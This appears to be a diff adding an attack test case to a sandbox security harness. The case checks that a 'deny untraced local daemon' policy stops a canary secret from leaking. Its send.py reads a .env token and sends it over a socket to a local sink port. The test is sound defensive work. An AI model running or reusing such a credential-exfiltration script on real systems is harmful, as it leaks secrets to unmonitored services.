@@ -1,0 +1,28 @@
+# A local daemon marsh does not trace (the harness's local sink stands in for a
+# database, Docker's socket or a proxy) receives whatever reaches it, beyond
+# the taint table's sight. Under `untraced_local(Deny)` a principal that read
+# the secret may not contact it, so the canary must not arrive.
+name = "untraced-local-daemon-exfil"
+kind = "attack"
+policy = "untraced-local-deny"
+
+[[files]]
+path = ".env"
+contents = "TOKEN={CANARY}\n"
+
+[[files]]
+path = "send.py"
+contents = """
+import socket
+secret = open(".env", "rb").read()
+s = socket.socket()
+s.connect(("127.0.0.1", {LOCAL_SINK_PORT}))
+s.sendall(secret)
+"""
+
+[[steps]]
+run = "python3 send.py"
+expect = "any"
+
+[oracle]
+encodings = ["raw", "base64", "hex"]
